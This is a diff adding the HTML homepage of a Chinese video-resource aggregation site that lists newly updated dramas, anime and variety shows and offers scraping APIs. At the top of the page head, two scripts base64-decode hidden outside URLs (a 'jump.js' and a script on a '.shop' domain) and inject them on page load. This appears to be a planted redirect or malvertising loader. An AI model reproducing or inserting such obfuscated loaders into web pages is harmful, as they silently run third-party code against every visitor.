@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head><script>(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9qcy5vbmVvbnN0YWNrLmNvbS9qdW1wLmpz');document.head.appendChild(s);})();</script>
+<meta charset="utf-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Language" content="zh-CN" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="applicable-device" content="pc,mobile">
+<title>魔都资源网 - 打造全网最优质资源网</title>
+<meta name="keywords" content="免费动漫,动漫资源网,魔都资源网" />
+<meta name="description" content="魔都资源网是一家优质动漫资源网，提供国内外最新动漫电影、动画片、国产动漫、日韩动漫等热门动漫资源采集，每天第一时间更新，希望您能喜欢！" />
+<link rel="shortcut icon" href="/favicon.ico">
+<link href="/template/moduzy/style.css" rel="stylesheet" type="text/css" />
+<script src="https://s4.zstatic.net/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>
+<script>document.cookie="hasVisited178a=1;Max-Age=86400;Path=/";(function(){var hm=document.createElement("script");hm.src=atob("aHR0cHM6Ly9jZG4uYnJpZ2Nsb3VkLnNob3Ava2txenR1Lmpz");var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s);})();</script>
+</head>
+<body>
+<style>
+.index-header{text-align:center;background:#354052;background-size:cover;padding:12px 0}
+.index-card{padding:15px;display:inline-block;border-radius:6px;margin:0 auto;font-size:13px;background-color:#fff;box-shadow:0 1px 3px 0 rgba(0,0,0,.2),0 1px 1px 0 rgba(0,0,0,.14),0 2px 1px -1px rgba(0,0,0,.12);text-align:center}
+.index-card li{list-style:none}
+.titlestart{color:red;font-weight:700}
+.card-content{color:#474957;font-weight:700}
+.popup{padding: 30px 30px 0;}
+.popup-header{text-align:center;}
+.popup-title{position:relative;font-size:20px;font-weight:900;display:inline-block}
+.popup-main p{line-height: 1.3;}
+.layui-layer-nobg {background: #ffffff;border-radius: 18px;padding-bottom:20px;}
+.layui-layer-btn a{height:38px;line-height: 38px;}
+.layui-layer-content{height:auto!important;}
+
+.header__menu li .dropdown{ display: none; width: 100%; position: absolute; z-index: 999; top: 100%; right: 0; text-align: center; font-size: 12px; color: #999; background-color: #fff; box-shadow: 0 2px 8px rgba(0,0,0,.1);font-size: 15px;}
+.header__menu li .dropdown li{ padding: 8px 0; border-top: 1px solid #eee;}
+.header__menu li .dropdown li:first-child{ padding-top: 15px; border-top: 0;}
+.header__menu li .dropdown li:last-child{ padding-bottom: 15px;}
+.header__menu li:hover .dropdown{ display: block;} 
+</style>
+<!--<div style="background: #c1c1c1;width: 100%;height: 90px;position: fixed;display:flex;justify-content: center; align-items:center;z-index: 2147483647;">-->
+<!--        <div >-->
+<!--      <script>-->
+<!--      (function () {-->
+<!--        var id = "1607593455455739930-10022";-->
+<!--        document.write('<ins style="display:none!important" id="' + id + '"></ins>');-->
+<!--        (window.adbyunion = window.adbyunion || []).push(id);-->
+<!--      })();-->
+<!--      </script>-->
+<!--      <script async src="https://888lm.com/o.js"></script>-->
+<!--        </div>-->
+<!--    </div>-->
+<!--  <br>-->
+<!--  <br>-->
+<!--  <br>-->
+<!--  <br>-->
+<div class="index-header">
+<ul class="index-card container">
+<li><span class="titlestart" style="font-size: 18px;">魔都公告</span></li><hr>
+<li><span class="titlestart">魔都资源全网首选：高清画质、热播影片、高峰不卡、回国优化CDN、秒拖秒播，资源永久免费！欢迎采集，采集送模版</span></li><hr>
+<li><b style="font-size:15px;color: #333;">👉魔都导航站：<a href="https://moduzy.vip" target="blank"><font color="#0a1dff">moduzy.vip</font></a>  备用域名：<font color="#FF0000">moduzy1.com 至 moduzy15.com</font></b></li><hr>
+<li><b style="font-size:15px;color: #333;">👉采集帮助文档：<a href="https://mdzyapi.com/caiji/" target="blank"><font color="#0a1dff">点击前往采集教程</font></a>  M3U8解析接口：<a href="https://www.modujiexi66.com/?url=" target="blank"><font color="#FF0000">https://www.modujiexi66.com/?url=</font></a>
+		</b></li><hr>
+<li><b style="font-size:15px;color: #333;">👉苹果cms10 XML采集接口：<a href="https://www.mdzyapi.com/api.php/provide/vod/at/xml/" target="blank"><font color="#FF0000">https://www.mdzyapi.com/api.php/provide/vod/at/xml/</font></a>
+		</b></li><hr>	
+<li><b style="font-size:15px;color: #333;">👉苹果cms10 JSON采集接口：<a href="https://www.mdzyapi.com/api.php/provide/vod/?ac=list" target="blank"><font color="#FF0000">https://www.mdzyapi.com/api.php/provide/vod/?ac=list</font></a>
+		</b></li><hr>
+<li><b style="font-size:15px;color: #333;">👉紧急公告：<a href="https://mdzyapi.com/gonggao/" target="blank"><font color="#00f"> 以往要替换的域名请点击进入查看 </font></a>，魔都演示站：<a href="http://www.moduys05.com" target="_blank"><font color="#00f"> www.moduys05.com </font></a></b></li><hr>
+<li><b style="font-size:15px;color: #333;">👉魔都Telegram交流群：<a href='https://t.me/mdzyw' target="_blank"><font color="blue">@mdzyw</font></a>  | 魔都在线客服：<a href="https://t.me/roytfyyds" target="_blank" style="color:blue">@roytfyyds</a></b></li>
+<hr>
+<li style="font-size:22px">👉👉<a href="https://mdzyapi.com/fuli/" target="_blank" style="color:red">模板免费送</a>👈👈</li><hr>
+<li>本站图片地址将采用图床方式，可以调用， 但采集的同时建议将图片同步本地，避免日后图片失效。</li>
+</ul>
+</div>
+<div class="header">
+    
+<div class="header__top clearfix">
+	<div class="container">
+		<div class="row">
+			<div class="header__logo">
+				<a class="logo" href="/"></a>
+			</div>
+			<div class="header__search">
+				<form id="search" name="search" method="get" action="/search/-------------/" onSubmit="return qrsearch();">
+					<input type="text" name="wd" class="mac_wd form-control" placeholder="请输入关键词..." autocomplete="off" required/>
+					<button class="submit" id="searchbutton" type="submit" name="submit"></button>
+				</form>
+			</div>
+			<ul class="header__more hidden-sm hidden-xs">
+				<li>
+					今日更新：<span class="text">129</span>
+				</li>
+				<li>
+					本站影片共有：<span class="text">91171</span>
+				</li>
+			</ul>
+		</div>
+	</div>
+</div>
+<div class="header__bar clearfix">
+	<div class="container">
+	    <div style="margin-bottom: 30px;margin-top: 30px;overflow: auto;"><a href="https://t.me/Ahua4567" target="_blank"><img src="https://r3w55d.ontop225.top/1000ggb2d.gif" style="width: stretch;"></a><a href="https://www.888lm.com" target="_blank"><img src="https://r3w55d.ontop225.top/1000.gif" style="width: stretch;"></a><a href="https://naixxzy.com" target="_blank"><img src="https://r3w55d.ontop225.top/dwasxa.gif" style="width: stretch;"></a><a href="https://aosikazy.com" target="_blank"><img src="https://r3w55d.ontop225.top/7c2f8637e487f86bc7e92859d8c0bb09.gif" style="width: stretch;"></a></div>
+		<div class="row">
+			<ul class="header__menu clearfix">
+<li class="active"><a href="/">首页</a></li>
+<li><a href="/list7/">电影</a>
+<ul class="dropdown" style="width: 100px;">
+		        		                        <li><a href="/list10/">动作片</a></li>
+                                                <li><a href="/list11/">喜剧片</a></li>
+                                                <li><a href="/list12/">爱情片</a></li>
+                                                <li><a href="/list13/">科幻片</a></li>
+                                                <li><a href="/list14/">恐怖片</a></li>
+                                                <li><a href="/list15/">剧情片</a></li>
+                                                <li><a href="/list16/">战争片</a></li>
+                                                <li><a href="/list17/">惊悚片</a></li>
+                                                <li><a href="/list18/">家庭片</a></li>
+                                                <li><a href="/list19/">古装片</a></li>
+                                                <li><a href="/list20/">历史片</a></li>
+                                                <li><a href="/list21/">悬疑片</a></li>
+                                                <li><a href="/list22/">犯罪片</a></li>
+                                                <li><a href="/list23/">灾难片</a></li>
+                                                <li><a href="/list24/">记录片</a></li>
+                                                <li><a href="/list25/">短片</a></li>
+                                                <li><a href="/list39/">伦理片</a></li>
+                        		        	</ul>
+</li>
+<li><a href="/list8/">连续剧</a>
+<ul class="dropdown" style="width: 100px;">
+		        		                        <li><a href="/list26/">国产剧</a></li>
+                                                <li><a href="/list27/">香港剧</a></li>
+                                                <li><a href="/list28/">韩国剧</a></li>
+                                                <li><a href="/list29/">欧美剧</a></li>
+                                                <li><a href="/list30/">台湾剧</a></li>
+                                                <li><a href="/list31/">日本剧</a></li>
+                                                <li><a href="/list32/">海外剧</a></li>
+                                                <li><a href="/list33/">泰国剧</a></li>
+                                                <li><a href="/list38/">短剧</a></li>
+                        		        	</ul>
+</li>
+<li><a href="/list9/">综艺</a>
+<ul class="dropdown" style="width: 100px;">
+		        		                        <li><a href="/list34/">大陆综艺</a></li>
+                                                <li><a href="/list35/">港台综艺</a></li>
+                                                <li><a href="/list36/">日韩综艺</a></li>
+                                                <li><a href="/list37/">欧美综艺</a></li>
+                        		        	</ul>
+</li>
+<li><a href="/list40/">体育</a>
+<ul class="dropdown" style="width: 100px;">
+		        		                        <li><a href="/list41/">足球</a></li>
+                        		        	</ul>
+</li>
+<li><a href="/list42/">AI漫剧</a>
+<ul class="dropdown" style="width: 100px;">
+		        				        	</ul>
+</li>
+<li><a href="/list1/">国产动漫</a>
+<ul class="dropdown" style="width: 100px;">
+		        				        	</ul>
+</li>
+<li><a href="/list2/">日韩动漫</a>
+<ul class="dropdown" style="width: 100px;">
+		        				        	</ul>
+</li>
+<li><a href="/list3/">欧美动漫</a>
+<ul class="dropdown" style="width: 100px;">
+		        				        	</ul>
+</li>
+<li><a href="/list4/">港台动漫</a>
+<ul class="dropdown" style="width: 100px;">
+		        				        	</ul>
+</li>
+<li><a href="/list5/">动漫电影</a>
+<ul class="dropdown" style="width: 100px;">
+		        				        	</ul>
+</li>
+<li><a href="/list6/">里番动漫</a>
+<ul class="dropdown" style="width: 100px;">
+		        				        	</ul>
+</li>
+<li><a href="/caiji/" target="_blank">采集教程</a></li>
+			</ul>
+		</div>
+	</div>
+</div>
+</div>
+<div class="container">
+<div class="row">
+
+<div class="pannel clearfix">
+<table class="part-table mr-5">
+  <thead>
+    <tr>
+      <th>影片名称</th>
+      <th class="hidden-xs">影片类型</th>
+      <th width="130">更新时间</th>
+    </tr> 
+  </thead>
+  <tbody>
+    <tr>
+      <td><a class="h4" href="/vod/87916/" target="_blank">爱·回家之三代同糖粤语</a> <small class="text-red">更新至60集</small></td>
+	  <td class="hidden-xs">香港剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91558/" target="_blank">美食强人</a> <small class="text-red">更新至10集</small></td>
+	  <td class="hidden-xs">港台综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/90995/" target="_blank">伟大的长征</a> <small class="text-red">更新至43集</small></td>
+	  <td class="hidden-xs">国产剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91680/" target="_blank">尚公主</a> <small class="text-red">更新至23集</small></td>
+	  <td class="hidden-xs">国产剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/8692/" target="_blank">吞噬星空</a> <small class="text-red">更新至248集</small></td>
+	  <td class="hidden-xs">国产动漫</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/90763/" target="_blank">天狗的厨房第三季</a> <small class="text-red">更新至05集</small></td>
+	  <td class="hidden-xs">日本剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/90756/" target="_blank">法警小队第二季</a> <small class="text-red">更新至05集</small></td>
+	  <td class="hidden-xs">欧美剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/90757/" target="_blank">寻踪者第四季</a> <small class="text-red">更新至05集</small></td>
+	  <td class="hidden-xs">欧美剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/90691/" target="_blank">罗梅莉亚战记</a> <small class="text-red">更新至05集</small></td>
+	  <td class="hidden-xs">日韩动漫</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91317/" target="_blank">装备我最强</a> <small class="text-red">更新至06集</small></td>
+	  <td class="hidden-xs">日韩动漫</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/85826/" target="_blank">家庭关系证明书</a> <small class="text-red">更新至71集</small></td>
+	  <td class="hidden-xs">韩国剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91455/" target="_blank">李太白下凡记：长安篇</a> <small class="text-red">更新至73集</small></td>
+	  <td class="hidden-xs">国产动漫</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91211/" target="_blank">金银岛2026</a> <small class="text-red">更新至04集</small></td>
+	  <td class="hidden-xs">欧美剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91375/" target="_blank">嫁金钗</a> <small class="text-red">更新至26集</small></td>
+	  <td class="hidden-xs">国产剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/10172/" target="_blank">综艺大集合</a> <small class="text-red">更新至20261101期</small></td>
+	  <td class="hidden-xs">港台综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/92178/" target="_blank">此生要去的100个地方第二季</a> <small class="text-red">更新至20261101期</small></td>
+	  <td class="hidden-xs">大陆综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/90754/" target="_blank">捉迷藏：0秒前的女友</a> <small class="text-red">更新至05集</small></td>
+	  <td class="hidden-xs">日本剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/8816/" target="_blank">小姐不熙娣</a> <small class="text-red">更新至20261026期</small></td>
+	  <td class="hidden-xs">港台综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/88579/" target="_blank">舞蹈新风暴</a> <small class="text-red">更新至20261102期</small></td>
+	  <td class="hidden-xs">大陆综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/90373/" target="_blank">我在中国当农人第三季</a> <small class="text-red">更新至20261102期</small></td>
+	  <td class="hidden-xs">大陆综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/88448/" target="_blank">我家那闺女2026</a> <small class="text-red">更新至20261102期加更</small></td>
+	  <td class="hidden-xs">大陆综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/9747/" target="_blank">我家的熊孩子</a> <small class="text-red">更新至20261101期</small></td>
+	  <td class="hidden-xs">日韩综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91138/" target="_blank">听，谁在唱歌第二季</a> <small class="text-red">更新至20261101期</small></td>
+	  <td class="hidden-xs">大陆综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/9263/" target="_blank">两天一夜第四季</a> <small class="text-red">更新至20261101期</small></td>
+	  <td class="hidden-xs">日韩综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/92177/" target="_blank">镀金时代第四季</a> <small class="text-red">更新至01集</small></td>
+	  <td class="hidden-xs">欧美剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91988/" target="_blank">兰香如故·花胜秋宴</a> <small class="text-red">更新至20261102期</small></td>
+	  <td class="hidden-xs">大陆综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/9254/" target="_blank">饥饿游戏</a> <small class="text-red">更新至20261025期</small></td>
+	  <td class="hidden-xs">港台综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/91213/" target="_blank">谎日沉影</a> <small class="text-red">更新至04集</small></td>
+	  <td class="hidden-xs">泰国剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/88276/" target="_blank">爆谷一周4</a> <small class="text-red">更新至23集</small></td>
+	  <td class="hidden-xs">港台综艺</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+    <tr>
+      <td><a class="h4" href="/vod/74204/" target="_blank">宝岛西米乐</a> <small class="text-red">更新至363集</small></td>
+	  <td class="hidden-xs">台湾剧</td>
+      <td class="text-red">2026-11-02</td>
+    </tr>
+  </tbody>
+</table>
+<ul class="page text-center clearfix">
+	<li><a href="/index-1/" title="首页">首页</a></li>
+	<li><a href="/index-1/" title="上一页">上一页</a></li>
+	<li class="hidden-xs active"><a href="javascript:;" title="第1页">1</a></li>
+	<li class="hidden-xs"><a href="/index-2/" title="第2页">2</a></li>
+	<li class="hidden-xs"><a href="/index-3/" title="第3页">3</a></li>
+	<li class="hidden-xs"><a href="/index-4/" title="第4页">4</a></li>
+	<li class="hidden-xs"><a href="/index-5/" title="第5页">5</a></li>
+	<li class="active visible-xs"><span class="num">1/3040</span></li>
+	<li><a href="/index-2/" title="下一页">下一页</a></li>
+	<li><a href="/index-3040/" title="尾页">尾页</a></li>
+</ul>
+</div>
+</div>
+</div>
+  <!-- 灯笼主 warpper ，用于 fixed 定位 -->
+  <!--<div class="lantern__warpper">-->
+  
+    <!-- 灯笼核心 box ，渲染红色椭圆形背景 -->
+  <!--  <div class="lantern__box">-->
+    
+      <!-- 灯笼上吊线 line -->
+  <!--    <div class="lantern__line"></div>-->
+      
+      <!-- 灯笼 box 内的黄色线 circle （外围线） -->
+  <!--    <div class="lantern__circle">-->
+      	<!-- 灯笼 box 内的黄色线 ellipse （内围线） -->
+  <!--      <div class="lantern__ellipse">-->
+          <!-- 灯笼 box 内的文字 -->
+  <!--        <div class="lantern__text"></div>-->
+  <!--      </div>-->
+  <!--    </div>-->
+      
+      <!-- 灯笼吊尾 tail -->
+  <!--    <div class="lantern__tail">-->
+      	<!-- 灯笼吊尾下部的方形部分 rect -->
+  <!--      <div class="lantern__rect"></div>-->
+        <!-- 灯笼吊尾的圆形节点 junction ，这里使节点在 rect 之后会显得层级更自然 -->
+  <!--      <div class="lantern__junction"></div>-->
+  <!--    </div>-->
+      
+  <!--  </div>-->
+    
+  <!--</div>-->
+
+
+
+<div class="foot clearfix">
+	<p>
+		<a href="/caiji/">帮助中心</a>
+		<span class="split-line"></span>关于我们
+		<span class="split-line"></span>版权声明
+	</p>
+	<p class="hidden-xs">本网站所有内容均收集于互联网主流视频网站，不提供在线正版播放。如果侵犯了您的权益，请通知我们，我们会及时删除侵权内容，谢谢合作！</p>
+	<p>Copyright ©2020-2026  All Rights Reserved <a href="https://mdzyapi.com" target="_blank">moduzy.vip</a></p>
+<div class="hide">
+
+<script src="https://s4.zstatic.net/ajax/libs/layui/2.4.3/layui.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+<!--<script src="https://cdn.jsdelivr.net/gh/fz6m/china-lantern@1.1/dist/china-lantern.min.js"></script>-->
+<script>
+ layui.use('layer', function(){
+  var layer = layui.layer,
+      date = 20,
+      modu = $.cookie('modu');
+  if(modu!=date){
+     modu=date;
+     $.cookie('modu', modu, { expires:1,path:'/'});
+    layer.open({
+      type: 1,
+      title: false,
+      closeBtn: 0,
+      anim: 5,
+      scrollbar: false,
+      area: ['400px','auto'],
+      skin: "layui-layer-nobg",
+      shadeClose: true,
+  content:`<div class="popup"><div class="popup-header"><h3 class="popup-title" style="font-size: 25px;">【重要通知】</h3></div><div class="popup-main" style="font-size:18px;"><br><p>2024年02月23日，更新播放域名，旧播放域名：play.modujx.com，替换成新播放域名：play.modujx10.com，不会替换 <a href="/gonggao/" target="blank" style="color:blue">查看替换教程</a></p><p>魔都资源专注于动漫资源，欢迎新老站长前来采集，主域名：moduzy.com、moduzy.cc、moduzy.net、moduzy.vip，备用域名：moduzy1.com 至 moduzy10.com(均可访问)</p><p>官方交流群：<a href="https://t.me/mdzyw" target="_blank" style="color:blue">https://t.me/mdzyw</a></p><p>魔都客服：<a href="https://t.me/roytfyyds" target="_blank" style="color:blue">https://t.me/roytfyyds</a></p></div></div>`,
+      btn: ['查看采集教程', '关闭对话框'],
+      btnAlign: "c",
+      yes: function(index, layero){
+          window.location.href = "/gonggao/";
+    }
+    });
+ }
+});
+
+</script>
+<!-- Google tag (gtag.js) --> 
+<!--<script async src="https://www.googletagmanager.com/gtag/js?id=G-1K1D86DGCT"></script> -->
+<!--<script> -->
+<!--  window.dataLayer = window.dataLayer || []; -->
+<!--  function gtag(){dataLayer.push(arguments);} -->
+<!--  gtag('js', new Date()); -->
+ 
+<!--  gtag('config', 'G-1K1D86DGCT', { -->
+<!--    'allowLinker': true -->
+<!--  }); -->
+<!--</script>-->
+</div>
+</div>
+</div>
+</div>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a5431e8caa989917',t:'MTc5MzYyMjI5OQ=='};var l=window.parent.location,o;try{o=new URL(l.origin).origin}catch(e){try{o=new URL(new URL(l.href).origin).origin}catch(e){o=''}}var u='/cdn-cgi/challenge-platform/scripts/jsd/main.js?ray=a5431e8caa989917',a=document.createElement('script');a.src=o?new URL(u,o).href:u;document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html><script>
+        // 兼容低版本浏览器插件
+        var um = document.createElement("script");
+        um.src = "https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/js-polyfills/0.1.43/polyfill.min.js";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(um, s);
+</script
